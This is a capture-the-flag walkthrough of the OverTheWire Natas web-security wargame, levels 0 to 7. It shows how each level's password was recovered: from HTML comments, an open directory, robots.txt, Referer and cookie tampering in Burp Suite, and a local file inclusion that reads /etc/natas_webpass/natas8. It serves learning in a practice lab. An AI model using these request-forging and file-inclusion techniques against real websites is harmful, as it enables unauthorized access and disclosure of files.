# OverTheWire Natas
OverTheWire Natas walkthrough

After the Bandit adventure, it's time to continue with Natas and web stuff :).

Natas teaches the basics of serverside web-security.

Each level of natas consists of its own website located at http://natasX.natas.labs.overthewire.org, where X is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.

Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in /etc/natas_webpass/. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.

Start here:

Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org

When we log in with the credentials, we get presented with and hint on the page: "You can find the password for the next level on this page.
".
So when we inspect elements we can easily see the password for the next level:
```html
<div id="content">
You can find the password for the next level on this page.

<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
</div>
```

# Natas 1

You can find the password for the next level on this page, but rightclicking has been blocked!

Luckily we can still open the developers tools just fine in the browser itself :).

```html
<div id="content">
You can find the password for the
next level on this page, but rightclicking has been blocked!

<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
</div>
```

# Natas 2

There is nothing on this page 

```html
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
</div>
```
But there is a file! I don't see anything special about the file directly though. We are in luck though, the directory containing the .png is open for the public (http://natas2.natas.labs.overthewire.org/files/) and there is a users.txt file in there.
```txt
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

# Natas 3

There is nothing on this page

```html
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
</div>
```
That is interresting, google normally scrapes websites but checks robots.txt for useragents that aren't allowed to scrape and what they aren't allowed to scrape. So let's check it.
http://natas3.natas.labs.overthewire.org/robots.txt contains: 
```txt
User-agent: *
Disallow: /s3cr3t/
```
Let's check the dir, and it contains an users.txt!
```txt
natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```

# Natas 4 

Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/index.php" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

With this challenge we'll need to use burpsuite to intercept the package and modify it a bit. We know from the hint the site gives us that we need to access the site from: "http://natas5.natas.labs.overthewire.org/". We however don't have access to this page due to us not having the password.

However, when we look into burpsuite we'll see the packet we try to send is:
```http
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas4.natas.labs.overthewire.org/index.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```
We can see here that the packet also has an Referer header, so let's change that to: "http://natas5.natas.labs.overthewire.org/" and resend the packet.
```html
Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
```

# Natas 5

Access disallowed. You are not logged in

For this level we'll open burpsuite again. And looking at the package we send when trying to refresh the page we'll see:
```http
GET / HTTP/1.1
Host: natas5.natas.labs.overthewire.org
Cache-Control: max-age=0
Authorization: Basic bmF0YXM1OjBuMzVQa2dnQVBtMnpiRXBPVTgwMmMweDBNc24xVG9L
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: loggedin=0
Connection: keep-alive
```
We see here a cookie that displays: "loggedin=0", let's change that 0 into an 1 and send the packet away!
```html
Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
```

# Level 6

```html
<div id="content">


<form method="post">
Input secret: <input name="secret"><br>
<input type="submit" name="submit">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```
The extra sourcecode:
```php
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```
If we'll try to send a random secret we can once again use burpsuite, however. This time we'll intercept the response packet and there we'll see:
```html
<script>var wechallinfo = { "level": "natas6", "pass": "0RoJwHdSKWFTYR5WuiAewauSuNaBXned" };</script>
```
Which is quite funny since that is censored in the source code. However, this has no benefit for us.

But when we look at the sourcecode again we can see a secrets file: "include "includes/secret.inc";", so let's visit that on: "include "includes/secret.inc";"
```php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```
So let's put that secret and we'll get:
```html
Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
```

# Level 7
```html
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
```
When clicking on the home button the url changes to: "http://natas7.natas.labs.overthewire.org/index.php?page=home" but if we change "home" into "/etc/natas_webpass/natas8" (http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8). We get the password:
```html
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
```

# Level 8